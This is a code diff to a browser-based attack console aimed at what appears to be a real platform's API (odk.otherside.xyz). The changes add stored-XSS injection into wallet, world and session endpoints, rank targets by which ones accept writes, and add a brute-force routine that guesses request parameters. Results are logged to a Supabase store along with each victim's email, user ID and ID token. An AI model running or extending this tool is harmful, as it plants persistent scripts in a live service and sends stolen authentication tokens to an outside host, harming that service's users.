@@ -408,13 +408,15 @@
                 <div class="input-group">
                     <label>Target Endpoint:</label>
                     <select id="xssTarget">
-                        <option value="project">Create Project (POST /organizations/projects)</option>
-                        <option value="org-update">Update Organization (PATCH /organizations/current)</option>
-                        <option value="user-update">Update User (PATCH /accounts/users/current)</option>
-                        <option value="api-key">Create API Key (POST /organizations/apiKeys)</option>
-                        <option value="world-create">Create World (POST /worlds)</option>
+                        <option value="wallet-nonce" style="color:#86efac;">[200] Wallet Nonce (POST /wallet/nonce) - WRITABLE!</option>
+                        <option value="world-create" style="color:#fbbf24;">[400] Create World (POST /worlds) - needs params</option>
+                        <option value="wallet-signin" style="color:#fbbf24;">[400] Wallet Sign-In (POST /wallet/verify/signin) - needs params</option>
+                        <option value="sessions" style="color:#fbbf24;">[400] Sessions (POST /sessions) - needs params</option>
+                        <option value="project" style="color:#fca5a5;">[403] Create Project (POST /organizations/projects)</option>
+                        <option value="org-update" style="color:#fca5a5;">[403] Update Organization (PATCH /organizations/current)</option>
+                        <option value="user-update" style="color:#fca5a5;">[403] Update User (PATCH /accounts/users/current)</option>
+                        <option value="api-key" style="color:#fca5a5;">[403] Create API Key (POST /organizations/apiKeys)</option>
                         <option value="world-update">Update World (PATCH /worlds/{ID})</option>
-                        <option value="wallet-signin">Wallet Sign-In (POST /wallet/verify/signin)</option>
                         <option value="custom">Custom Endpoint</option>
                     </select>
                 </div>
@@ -435,6 +437,7 @@
                     <button class="btn btn-primary" onclick="injectXSS()" id="xssBtn">Inject XSS Payload</button>
                     <button class="btn btn-danger" onclick="injectAllPayloads()">Inject ALL Payloads</button>
                     <button class="btn btn-outline" onclick="testXSSReflection()">Test Reflection First</button>
+                    <button class="btn btn-outline" onclick="discoverParams()" style="background:#1a3a3a;color:#93c5fd;">Discover Params (400 endpoints)</button>
                 </div>
             </div>
             <div class="card">
@@ -987,6 +990,12 @@
         // STORED XSS INJECTION
         // =====================================================
 
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
         function renderPayloads() {
             const list = document.getElementById('payloadList');
             list.innerHTML = '';
@@ -994,11 +1003,16 @@
                 const item = document.createElement('div');
                 item.className = `payload-item${i === selectedPayload ? ' selected' : ''}`;
                 item.onclick = () => { selectedPayload = i; renderPayloads(); };
-                item.innerHTML = `
-                    <span class="tag ${p.tagClass}">${p.tag}</span>
-                    <div class="payload-code">${p.payload.substring(0, 80)}...</div>
-                `;
-                item.title = p.desc;
+                // Use textContent for payload code to prevent HTML rendering
+                const tagSpan = document.createElement('span');
+                tagSpan.className = `tag ${p.tagClass}`;
+                tagSpan.textContent = p.tag;
+                const codeDiv = document.createElement('div');
+                codeDiv.className = 'payload-code';
+                codeDiv.textContent = p.payload.substring(0, 120) + (p.payload.length > 120 ? '...' : '');
+                item.appendChild(tagSpan);
+                item.appendChild(codeDiv);
+                item.title = p.desc + '\n\nFull payload:\n' + p.payload;
                 list.appendChild(item);
             });
         }
@@ -1178,6 +1192,28 @@
             let endpoint, method, body;
 
             switch(target) {
+                case 'wallet-nonce':
+                    endpoint = 'wallet/nonce';
+                    method = 'POST';
+                    // /wallet/nonce returns 200 - inject XSS in evmWalletAddress field
+                    body = JSON.stringify({ evmWalletAddress: payload });
+                    break;
+                case 'world-create':
+                    endpoint = 'worlds';
+                    method = 'POST';
+                    // Try multiple field formats for /worlds (returns 400 with simple params)
+                    body = JSON.stringify({ name: payload, description: 'New World', worldName: payload, title: payload });
+                    break;
+                case 'wallet-signin':
+                    endpoint = 'wallet/verify/signin';
+                    method = 'POST';
+                    body = JSON.stringify({ evmWalletAddress: payload });
+                    break;
+                case 'sessions':
+                    endpoint = 'sessions';
+                    method = 'POST';
+                    body = JSON.stringify({ name: payload, sessionName: payload, displayName: payload });
+                    break;
                 case 'project':
                     endpoint = 'organizations/projects';
                     method = 'POST';
@@ -1198,20 +1234,10 @@
                     method = 'POST';
                     body = JSON.stringify({ displayName: payload });
                     break;
-                case 'world-create':
-                    endpoint = 'worlds';
-                    method = 'POST';
-                    body = JSON.stringify({ name: payload, description: 'New World' });
-                    break;
                 case 'world-update':
                     endpoint = `worlds/${projectId}`;
                     method = 'PATCH';
                     body = JSON.stringify({ name: payload });
-                    break;
-                case 'wallet-signin':
-                    endpoint = 'wallet/verify/signin';
-                    method = 'POST';
-                    body = JSON.stringify({ evmWalletAddress: payload });
                     break;
                 case 'custom':
                     endpoint = document.getElementById('xssCustomEndpoint').value;
@@ -1297,14 +1323,18 @@
 
         async function injectAllPayloads() {
             if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
-            log('xssLog', '[XSS] Injecting ALL payloads across multiple endpoints...', 'warning');
+            log('xssLog', '[XSS] Injecting ALL payloads - prioritizing WRITABLE endpoints...', 'warning');
 
+            // Prioritize writable endpoints first!
             const injectionTargets = [
-                { endpoint: 'organizations/projects', method: 'POST', field: 'name', desc: 'Create Project' },
-                { endpoint: 'organizations/current', method: 'PATCH', field: 'name', desc: 'Update Org Name' },
-                { endpoint: 'accounts/users/current', method: 'PATCH', field: 'displayName', desc: 'Update User DisplayName' },
-                { endpoint: 'organizations/apiKeys', method: 'POST', field: 'displayName', desc: 'Create API Key' },
-                { endpoint: 'worlds', method: 'POST', field: 'name', desc: 'Create World' },
+                { endpoint: 'wallet/nonce', method: 'POST', field: 'evmWalletAddress', desc: 'Wallet Nonce [200!]', priority: true },
+                { endpoint: 'worlds', method: 'POST', field: 'name', desc: 'Create World [400]', priority: true },
+                { endpoint: 'wallet/verify/signin', method: 'POST', field: 'evmWalletAddress', desc: 'Wallet Sign-In [400]', priority: true },
+                { endpoint: 'sessions', method: 'POST', field: 'name', desc: 'Sessions [400]', priority: true },
+                { endpoint: 'organizations/projects', method: 'POST', field: 'name', desc: 'Create Project [403]', priority: false },
+                { endpoint: 'organizations/current', method: 'PATCH', field: 'name', desc: 'Update Org Name [403]', priority: false },
+                { endpoint: 'accounts/users/current', method: 'PATCH', field: 'displayName', desc: 'Update User DisplayName [403]', priority: false },
+                { endpoint: 'organizations/apiKeys', method: 'POST', field: 'displayName', desc: 'Create API Key [403]', priority: false },
             ];
 
             for (let i = 0; i < XSS_PAYLOADS.length; i++) {
@@ -1398,6 +1428,118 @@
 
             log('xssLog', '[TEST] Open https://odk.otherside.xyz/dashboard to check if HTML renders!', 'warning');
         }
+        // =====================================================
+        // PARAMETER DISCOVERY - Brute-force body formats
+        // for endpoints that return 400 (wrong params)
+        // =====================================================
+        async function discoverParams() {
+            if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('xssLog', '[DISCOVER] Brute-forcing parameter names for 400 endpoints...', 'warning');
+
+            const endpoints400 = [
+                { ep: 'worlds', method: 'POST', desc: 'Create World' },
+                { ep: 'wallet/verify/signin', method: 'POST', desc: 'Wallet Sign-In' },
+                { ep: 'sessions', method: 'POST', desc: 'Sessions' },
+            ];
+
+            // Common field names that APIs might accept
+            const fieldCombos = [
+                // Worlds endpoints
+                { ep: 'worlds', bodies: [
+                    { name: 'test' },
+                    { worldName: 'test' },
+                    { title: 'test' },
+                    { name: 'test', description: 'test' },
+                    { worldName: 'test', description: 'test' },
+                    { name: 'test', type: 'public' },
+                    { name: 'test', visibility: 'public' },
+                    { name: 'test', category: 'general' },
+                    { name: 'test', tags: ['test'] },
+                    { name: 'test', worldId: '1' },
+                    { worldId: 'test', name: 'test' },
+                    { id: '1', name: 'test' },
+                    { slug: 'test', name: 'test' },
+                    { name: 'test', status: 'active' },
+                    { name: 'test', ownerId: '1' },
+                    { name: 'test', configuration: {} },
+                ]},
+                // Wallet verify/signin
+                { ep: 'wallet/verify/signin', bodies: [
+                    { evmWalletAddress: '0x0000000000000000000000000000000000000001' },
+                    { walletAddress: '0x0000000000000000000000000000000000000001' },
+                    { address: '0x0000000000000000000000000000000000000001' },
+                    { evmWalletAddress: '0x0000000000000000000000000000000000000001', signature: '0x00' },
+                    { evmWalletAddress: '0x0000000000000000000000000000000000000001', nonce: '1' },
+                    { evmWalletAddress: '0x0000000000000000000000000000000000000001', message: 'test' },
+                    { evmWalletAddress: '0x0000000000000000000000000000000000000001', signedMessage: '0x00' },
+                ]},
+                // Sessions
+                { ep: 'sessions', bodies: [
+                    { name: 'test' },
+                    { sessionName: 'test' },
+                    { sessionId: '1' },
+                    { type: 'streaming' },
+                    { worldId: '1' },
+                    { projectId: '1' },
+                    { userId: '1' },
+                    { name: 'test', duration: 60 },
+                    { name: 'test', status: 'active' },
+                    { name: 'test', worldId: '1' },
+                    { configuration: { quality: 'high' } },
+                ]},
+            ];
+
+            for (const combo of fieldCombos) {
+                log('xssLog', `[DISCOVER] Testing ${combo.ep} with ${combo.bodies.length} body formats...`, 'info');
+
+                for (const body of combo.bodies) {
+                    try {
+                        const resp = await apiWrite(combo.ep, 'POST', JSON.stringify(body));
+                        const label = JSON.stringify(Object.keys(body));
+
+                        if (resp.ok) {
+                            const data = await resp.json();
+                            log('xssLog', `[+] ${combo.ep} SUCCESS with ${label}! Status: ${resp.status}`, 'success');
+                            log('xssLog', `[+] Response: ${JSON.stringify(data).substring(0, 150)}`, 'data');
+
+                            await saveToSupabase({
+                                attack_type: 'param_discovery',
+                                victim_email: currentUser?.email || '',
+                                victim_uid: currentUser?.uid || '',
+                                id_token: idToken,
+                                xss_target: `POST ${API}/${combo.ep}`,
+                                xss_payload: label,
+                                notes: `Found working params for ${combo.ep}: ${label}. Response: ${JSON.stringify(data).substring(0, 200)}`
+                            });
+
+                            xssInjected++;
+                        } else if (resp.status === 400) {
+                            const errText = await resp.text();
+                            // Check if error message reveals expected field names
+                            if (errText.includes('required') || errText.includes('field') || errText.includes('parameter') || errText.includes('missing')) {
+                                log('xssLog', `[HINT] ${combo.ep} ${label}: 400 - ${errText.substring(0, 120)}`, 'warning');
+                            } else {
+                                log('xssLog', `[-] ${combo.ep} ${label}: 400`, 'error');
+                            }
+                        } else if (resp.status === 403) {
+                            log('xssLog', `[-] ${combo.ep} ${label}: 403 (no permission)`, 'error');
+                        } else if (resp.status === 201) {
+                            log('xssLog', `[+] ${combo.ep} CREATED with ${label}! Status: 201`, 'success');
+                            xssInjected++;
+                        } else {
+                            log('xssLog', `[?] ${combo.ep} ${label}: ${resp.status}`, 'warning');
+                        }
+                    } catch(e) {
+                        log('xssLog', `[!] ${combo.ep} ${label}: ${e.message}`, 'error');
+                    }
+                    await new Promise(r => setTimeout(r, 200));
+                }
+            }
+
+            log('xssLog', `[DISCOVER] Parameter discovery complete. Found ${xssInjected} working combinations.`, 'success');
+            updateStats();
+        }
+
     </script>
 </body>
 </html>
